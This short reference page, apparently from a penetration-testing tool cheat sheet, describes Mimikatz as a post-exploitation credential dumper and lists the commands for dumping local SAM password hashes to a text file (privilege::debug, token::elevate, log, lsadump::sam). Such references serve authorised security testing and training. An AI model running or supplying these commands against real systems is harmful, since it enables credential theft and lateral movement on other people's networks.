**Mimikatz**
===========


Abstract
--------

> *Is a leading post-exploitation tool that dumps passwords from memory, as well as hashes, PINs and Kerberos tickets. Other useful attacks it enables are pass-the-hash, pass-the-ticket or building Golden Kerberos tickets. This makes post-exploitation lateral movement within a network easy for attackers.*
 
Source: <a href='https://github.com/gentilkiwi/mimikatz' target='_blank'>Mimikatz</a>

Examples 
--------

**Note:** Some of the examples below presume files and paths that might not match your particular system and tool installation.

The following examples are after the download and run Mimikatz:


**Dumping the hashes with Mimikatz and LSAdump**

Run Mimikatz 
```bash 
$ Mimikatz.exe
```
```bash
$ privilege::debug
```
```bash
$ token::elevate
```
Run “log hash.txt” so that your next command will output to a txt file
```bash
log hash.txt
```
```bash
$ lsadump::sam 
```
Exit from Mimikatz...
```bash
$ exit
```


